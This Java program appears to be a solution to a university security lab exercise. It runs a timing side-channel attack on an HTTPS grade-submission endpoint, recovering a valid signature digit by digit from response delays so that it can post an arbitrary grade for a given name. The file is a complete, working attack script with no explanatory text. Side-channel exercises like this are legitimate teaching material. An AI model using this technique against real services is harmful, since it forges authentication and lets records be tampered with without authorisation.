package SignatureCalc;

import javax.net.ssl.HttpsURLConnection;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.*;
import java.util.stream.IntStream;

/**
 * Created by oskar on 2016-12-13.
 */
public class Main {
    public static void main(String[] args) {
        String address = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name=" + args[0] + "&grade=" + args[1] + "&signature=";
        URL url;


        try {

            HttpsURLConnection con;

            String signature = "";

            while (signature.length() < 20) {
                int[] times = new int[16];
                int loopCount = 0;
                while (loopCount < 16) {

                    String testHex = Integer.toHexString(loopCount);

                    url = new URL(address + signature + testHex);
                    con = (HttpsURLConnection) url.openConnection();

                    long currentTime = System.currentTimeMillis();

                    BufferedReader br = new BufferedReader(new InputStreamReader(con.getInputStream()));

                    times[loopCount] = (int) (System.currentTimeMillis() - currentTime);

                    String result = "";
                    String line;


                    while ((line = br.readLine()) != null) {
                        result += line;
                    }
                    br.close();

                    if (Integer.valueOf(result.trim()) != 0) {
                        System.out.println("Signature found: " + signature + testHex);
                        System.exit(0);
                    }
                    loopCount++;
                }
                int avg = IntStream.of(times).sum() / 16, largest = 0;
                int index = -1;
                for (int i = 0; i < times.length; i++) {
                    System.out.print(Integer.toHexString(i) + ": " + times[i] + " ");
                    if (times[i] > largest && times[i] - avg > 20 && times[i] - avg < 40) {
                        largest = times[i];
                        index = i;
                    }
                }
                System.out.println();
                if (index != -1) signature += Integer.toHexString(index);
                System.out.println("Current signature: " + signature);
            }


        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}
